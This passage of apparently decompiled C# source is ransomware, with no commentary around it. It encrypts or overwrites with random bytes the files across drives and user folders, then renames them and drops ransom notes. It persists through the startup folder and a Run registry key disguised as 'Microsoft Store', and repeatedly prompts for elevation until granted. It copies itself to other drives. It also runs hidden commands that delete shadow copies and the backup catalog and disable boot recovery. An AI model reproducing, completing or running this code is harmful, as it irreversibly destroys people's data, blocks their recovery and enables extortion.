		return stringBuilder.ToString();
	}

	public static string RandomStringForExtension(int length)
	{
		if (encryptedFileExtension == "")
		{
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < length; i++)
			{
				char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
				stringBuilder.Append(value);
			}
			return stringBuilder.ToString();
		}
		return encryptedFileExtension;
	}

	public static string Base64EncodeString(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return Convert.ToBase64String(bytes);
	}

	public static string randomEncode(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return "<EncyptedKey>" + Base64EncodeString(RandomString(41)) + "<EncyptedKey> " + RandomString(2) + Convert.ToBase64String(bytes);
	}

	private static void encryptDirectory(string location)
	{
		try
		{
			string[] files = Directory.GetFiles(location);
			bool flag = true;
			for (int i = 0; i < files.Length; i++)
			{
				try
				{
					string extension = Path.GetExtension(files[i]);
					string fileName = Path.GetFileName(files[i]);
					if (!Array.Exists(validExtensions, (string E) => E == extension.ToLower()) || !(fileName != droppedMessageTextbox))
					{
						continue;
					}
					FileInfo fileInfo = new FileInfo(files[i]);
					fileInfo.Attributes = FileAttributes.Normal;
					if (fileInfo.Length < 2117152)
					{
						if (encryptionAesRsa)
						{
							EncryptFile(files[i]);
						}
					}
					else if (fileInfo.Length > 200000000)
					{
						Random random = new Random();
						int length = random.Next(200000000, 300000000);
						string @string = Encoding.UTF8.GetString(random_bytes(length));
						File.WriteAllText(files[i], randomEncode(@string));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					else
					{
						string string2 = Encoding.UTF8.GetString(random_bytes(Convert.ToInt32(fileInfo.Length) / 4));
						File.WriteAllText(files[i], randomEncode(string2));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					if (flag)
					{
						flag = false;
						File.WriteAllLines(location + "/" + droppedMessageTextbox, messages);
					}
				}
				catch
				{
				}
			}
			string[] directories = Directory.GetDirectories(location);
			for (int j = 0; j < directories.Length; j++)
			{
				encryptDirectory(directories[j]);
			}
		}
		catch (Exception)
		{
		}
	}

	public static string rsaKey()
	{
		StringBuilder stringBuilder = new StringBuilder();
		return stringBuilder.ToString();
	}

	public static string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
		}
		return stringBuilder.ToString();
	}

	public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] array = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using MemoryStream memoryStream = new MemoryStream();
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
		{
			cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
			cryptoStream.Close();
		}
		return memoryStream.ToArray();
	}

	public static void EncryptFile(string file)
	{
		byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
		string text = CreatePassword(20);
		byte[] bytes = Encoding.UTF8.GetBytes(text);
		byte[] inArray = AES_Encrypt(bytesToBeEncrypted, bytes);
		File.WriteAllText(file, "<EncryptedKey>" + RSAEncrypt(text, rsaKey()) + "<EncryptedKey>" + Convert.ToBase64String(inArray));
		File.Move(file, file + "." + RandomStringForExtension(4));
	}

	public static string RSAEncrypt(string textToEncrypt, string publicKeyString)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(textToEncrypt);
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(1024);
		try
		{
			rSACryptoServiceProvider.FromXmlString(publicKeyString.ToString());
			byte[] inArray = rSACryptoServiceProvider.Encrypt(bytes, fOAEP: true);
			return Convert.ToBase64String(inArray);
		}
		finally
		{
			rSACryptoServiceProvider.PersistKeyInCsp = false;
		}
	}

	private static void lookForDirectories()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\")
			{
				encryptDirectory(driveInfo.ToString());
			}
		}
		string location = userDir + userName + "\\Desktop";
		string location2 = userDir + userName + "\\Links";
		string location3 = userDir + userName + "\\Contacts";
		string location4 = userDir + userName + "\\Desktop";
		string location5 = userDir + userName + "\\Documents";
		string location6 = userDir + userName + "\\Downloads";
		string location7 = userDir + userName + "\\Pictures";
		string location8 = userDir + userName + "\\Music";
		string location9 = userDir + userName + "\\OneDrive";
		string location10 = userDir + userName + "\\Saved Games";
		string location11 = userDir + userName + "\\Favorites";
		string location12 = userDir + userName + "\\Searches";
		string location13 = userDir + userName + "\\Videos";
		encryptDirectory(location);
		encryptDirectory(location2);
		encryptDirectory(location3);
		encryptDirectory(location4);
		encryptDirectory(location5);
		encryptDirectory(location6);
		encryptDirectory(location7);
		encryptDirectory(location8);
		encryptDirectory(location9);
		encryptDirectory(location10);
		encryptDirectory(location11);
		encryptDirectory(location12);
		encryptDirectory(location13);
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonMusic));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonVideos));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory));
	}

	private static void copyRoaming(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
			processStartInfo.WorkingDirectory = text;
			Process process = new Process();
			process.StartInfo = processStartInfo;
			if (process.Start())
			{
				Environment.Exit(1);
			}
			return;
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		ProcessStartInfo processStartInfo2 = new ProcessStartInfo(text2);
		processStartInfo2.WorkingDirectory = text;
		Process process2 = new Process();
		process2.StartInfo = processStartInfo2;
		if (process2.Start())
		{
			Environment.Exit(1);
		}
	}

	private static void copyResistForAdmin(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
		processStartInfo.UseShellExecute = true;
		processStartInfo.Verb = "runas";
		processStartInfo.WindowStyle = ProcessWindowStyle.Normal;
		processStartInfo.WorkingDirectory = text;
		ProcessStartInfo startInfo = processStartInfo;
		Process process = new Process();
		process.StartInfo = startInfo;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			try
			{
				Process.Start(startInfo);
				Environment.Exit(1);
				return;
			}
			catch (Win32Exception ex)
			{
				if (ex.NativeErrorCode == 1223)
				{
					copyResistForAdmin(processName);
				}
				return;
			}
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		try
		{
			Process.Start(startInfo);
			Environment.Exit(1);
		}
		catch (Win32Exception ex2)
		{
			if (ex2.NativeErrorCode == 1223)
			{
				copyResistForAdmin(processName);
			}
		}
	}

	private static void addLinkToStartup()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		string text = Process.GetCurrentProcess().ProcessName;
		using StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + text + ".url");
		string location = Assembly.GetExecutingAssembly().Location;
		streamWriter.WriteLine("[InternetShortcut]");
		streamWriter.WriteLine("URL=file:///" + location);
		streamWriter.WriteLine("IconIndex=0");
		string text2 = location.Replace('\\', '/');
		streamWriter.WriteLine("IconFile=" + text2);
	}

	private static void addAndOpenNote()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		try
		{
			File.WriteAllLines(text, messages);
			Thread.Sleep(500);
			Process.Start(text);
		}
		catch
		{
		}
	}

	private static void registryStartup()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("Microsoft Store", Assembly.GetExecutingAssembly().Location);
		}
		catch
		{
		}
	}

	private static void spreadIt(string spreadName)
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\" && !File.Exists(driveInfo.ToString() + spreadName))
			{
				try
				{
					File.Copy(Assembly.GetExecutingAssembly().Location, driveInfo.ToString() + spreadName);
				}
				catch
				{
				}
			}
		}
	}

	private static void runCommand(string commands)
	{
		Process process = new Process();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.Arguments = "/C " + commands;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo = processStartInfo;
		process.Start();
		process.WaitForExit();
	}

	private static void deleteShadowCopies()
	{
		runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
	}

	private static void disableRecoveryMode()
	{
		runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
	}

	private static void deleteBackupCatalog()
	{
		runCommand("wbadmin delete catalog -quiet");
	}

	public static void SetWallpaper(string base64)
	{
		if (base64 != "")
		{
			try
			{
				string text = Path.GetTempPath() + RandomString(9) + ".jpg";
				File.WriteAllBytes(text, Convert.FromBase64String(base64));
				SystemParametersInfo(20u, 0u, text, 3u);
			}
			catch
			{
			}
		}
	}
}
